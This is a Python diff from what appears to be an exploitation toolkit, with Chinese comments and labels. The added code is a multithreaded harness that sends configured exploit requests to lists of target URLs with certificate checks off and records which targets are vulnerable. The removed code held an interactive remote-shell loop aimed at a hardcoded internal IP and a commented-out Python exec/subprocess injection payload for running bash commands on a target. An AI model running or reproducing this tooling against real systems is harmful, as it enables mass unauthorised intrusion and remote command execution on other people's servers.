@@ -1,86 +1,183 @@
+import json
 import requests
-from .base import *
+import queue
+import threading
+import urllib3
+from mytools.base import *
+
+urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
+
+lock = threading.Lock()
+
+res1 = []  # 保存完整响应内容
+res2 = []  # 保存 URL
 
 
-def exp2(config1, config2, url, command=""):
-    save_dir = f"exp_output/res.txt"
+def write_final_results(config):
+    result_dir = f"output/exp_output/(len={len(res2)})_{str(config['targetName']).strip()}_{nowTime()}"
+    other_save_dir = "input/urls"
 
-    if config1["method"].upper() == "GET":
-        return run_get_exp(config, config2, url, save_dir, command)
-    elif config1["method"].upper() == "POST":
-        return run_post_exp_mul(config1, config2, url, save_dir, command)
+    config["save_dir"] = result_dir
+    config["other_save_dir"] = other_save_dir
+
+    mkdir(result_dir)
+    writeFile(f"{result_dir}/content.txt", res1)
+    writeFile(f"{result_dir}/res.txt", res2)
+    writeFile(f"{other_save_dir}/exp_res_urls.txt", res2)
 
 
-def run_get_exp(config, url, save_dir, command):
-    print()
+def write_res(current, total, url, content, config, counter):
+    counter[1] += 1
+    res = f"No: {counter[1]}\nurl: {url}\n{content}\n"
+    print(greenStr(f"\n[+] {current} / {total} 漏洞识别: {url}"))
+    print(greenStr(res))
+
+    res1.append(res)
+    res2.append(url)
 
 
-def run_post_exp(config, url, save_dir, command):
-    session = requests.Session()
-    content = ""
+def get_scan(url, headers, config, counter, total):
+    with lock:
+        counter[0] += 1
+        current = counter[0]
+
+    url = url if "://" in url else "http://" + url
+
     try:
-        resp = session.post(url + config["pocUrl"], headers=config["headers"], data=config["data"], verify=False,
+        session = requests.Session()
+        resp = session.get(url + config["require_path"], headers=headers, verify=False, timeout=config["waitTime"])
+        content = resp.text
+
+        for white in config["whiteList"]:
+            if all(black not in content for black in config["blackList"]) and white in content:
+                with lock:
+                    write_res(current, total, url, content, config, counter)
+                return
+        with lock:
+            print(yellowStr(f"[-] {current} / {total} 未识别: {url}"))
+    except Exception as e:
+        with lock:
+            print(redStr(f"[!] {current} / {total} 请求失败: {url}"), e)
+
+
+def get_worker(q, headers, config, counter, total):
+    while not q.empty():
+        url = q.get()
+        get_scan(url, headers, config, counter, total)
+        q.task_done()
+
+
+def run_get_exp(config, urls):
+    q = queue.Queue()
+    for url in urls:
+        q.put(url)
+
+    counter = [0, 0]
+    headers = {'User-Agent': 'Mozilla/5.0', 'Accept': '*/*', 'Connection': 'keep-alive'}
+    total = len(urls)
+
+    threads = []
+    for _ in range(config["threadingNum"]):
+        t = threading.Thread(target=get_worker, args=(q, headers, config, counter, total))
+        threads.append(t)
+        t.start()
+
+    for t in threads:
+        t.join()
+
+    write_final_results(config)
+
+
+def post_scan(url, config, counter, total):
+    with lock:
+        counter[0] += 1
+        current = counter[0]
+
+    url = url if "://" in url else "http://" + url
+    try:
+        session = requests.Session()
+        resp = session.post(url + config["require_path"], headers=config["headers"], data=config["data"], verify=False,
                             timeout=config["waitTime"])
         content = resp.text
-        res = f"url: {url}\ncommand: {command}\ntime: {nowTime()}\n{content}\n\n"
-        # print(greenStr(res))
-        appenFile(save_dir, res)
+
+        if config["whiteBoolean"] == "AND":
+            if all(white in content for white in config["whiteList"]) and all(
+                    black not in content for black in config["blackList"]):
+                with lock:
+                    write_res(current, total, url, content, config, counter)
+                return
+        elif config["whiteBoolean"] == "OR":
+            if any(white in content for white in config["whiteList"]) and all(
+                    black not in content for black in config["blackList"]):
+                with lock:
+                    write_res(current, total, url, content, config, counter)
+                return
+        with lock:
+            print(yellowStr(f"[-] {current} / {total} 未识别: {url}"))
     except Exception as e:
-        print(e)
-    return res
+        with lock:
+            print(redStr(f"[!] {current} / {total} 请求失败: {url}"), e)
 
 
-def exp(config, url, command=""):
-    save_dir = f"3-exp_output/res.txt"
+def post_worker(q, config, counter, total):
+    while not q.empty():
+        with lock:
+            url = q.get()
+        post_scan(url, config, counter, total)
+        q.task_done()
+
+
+def run_post_exp(config, urls):
+    print(f"------------------ exp模块 ------------------")
+    q = queue.Queue()
+    for url in urls:
+        q.put(url)
+
+    counter = [0, 0]
+    total = len(urls)
+
+    threads = []
+    for _ in range(config["threadingNum"]):
+        t = threading.Thread(target=post_worker, args=(q, config, counter, total))
+        threads.append(t)
+        t.start()
+
+    for t in threads:
+        t.join()
+
+    write_final_results(config)
+    print(greenStr(f"\n[+] 所有任务完成, 完成时间  -->  {nowTime()}"))
+    print(greenStr(f"[+] 一共 exp 到 {len(res2)} 个url"))
+    print(f"------------------ exp模块 ------------------")
+
+
+def load_config(config_path):
+    with open(config_path, "r", encoding="utf-8") as f:
+        return json.load(f)
+
+
+def exp_main(vul_path="input/exp/json/raw1.json"):
+    try:
+        readFile(vul_path)
+    except Exception as e:
+        print(yellowStr(f"请检查 {vul_path} 文件是否创建， 并且里面是否有值"))
+        return
+
+    config = load_config(vul_path)
+
+    urlsPath = "input/urls/poc_res_urls.txt"
+    try:
+        urls = readFile(urlsPath)
+    except Exception as e:
+        print(yellowStr(f"请检查 input/urls/urls.txt 文件是否创建， 并且里面是否有值"))
+        return
+
+    urls = list(set(url.strip() for url in urls if url.strip()))
 
     if config["method"].upper() == "GET":
-        return run_get_exp(config, url, save_dir, command)
+        run_get_exp(config, urls)
     elif config["method"].upper() == "POST":
-        return run_post_exp(config, url, save_dir, command)
-
-
-def run_post_exp_mul(config1, config2, url, save_dir, command):
-    content1 = sand(config1, url).text
-    content2 = sand(config2, url).text
-
-    content = greenStr(f"第一个包的响应为--->:\n {content1}\n\n第二个包的响应为--->:\n {content2}\n\n")
-
-    res = f"url: {url}\ncommand: {command}\ntime: {nowTime()}\n{content}\n\n"
-    appenFile(save_dir, res)
-    return content
-
-
-def shell(cmd, url):
-    # command = f"['bash','-c','find /{cmd} -iname wochao.txt']"
-    command = f"['bash','-c','{cmd}']"
-    # config["data"] = "{\"code\": \"@exec(\\\"raise Exception(__import__('subprocess').check_output(" + command + "))\\\")\\ndef foo():\\n  pass\", \"a7fb98s8pvr\": \"=\"}"
-
-    resp = exp(config, url, command)
-    print(f"结果为： {resp}")
-    if resp and "'" in resp:
-        res = resp.split("'")[1].replace("\\\\r", "").split("\\\\n")
-        for i in res:
-            print(i)
-    else:
-        print("[-] 响应为空或格式不符合预期")
-        print(resp)
-    print(resp)
-
-    while 1:
-        try:
-            cmd = input("请输入命令： ").strip()
-            if cmd == "exit":
-                break
-            if cmd == "":
-                continue
-            url = "http://192.168.3.125:9191"
-            shell(cmd, url)
-        except Exception as e:
-            print(redStr(e))
-
-
-def exp_main():
-    print()
+        run_post_exp(config, urls)
 
 
 if __name__ == '__main__':
